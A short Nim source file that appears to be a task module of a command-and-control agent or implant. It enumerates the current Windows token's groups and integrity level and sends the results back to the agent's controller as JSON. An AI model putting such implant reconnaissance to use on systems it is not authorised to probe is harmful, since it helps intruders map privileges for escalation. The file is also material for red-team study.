import std/[net, json, jsonutils]
import ../client/[communication, modules, types]

proc executeTask*(app: App, taskId: int, params: seq[string]) =
  let taskOutput = newTaskOutput taskId
  
  let tokenGroups: seq[tuple[name, sid, domain: string]] = getintegritygroups()
  let tokenIntegrity: string = getintegrity() 
  
  taskOutput.data = $(%*{
      "tokenGroups": toJson tokenGroups,
      "tokenIntegrity": tokenIntegrity
    })
  app.sendOutput(taskOutput)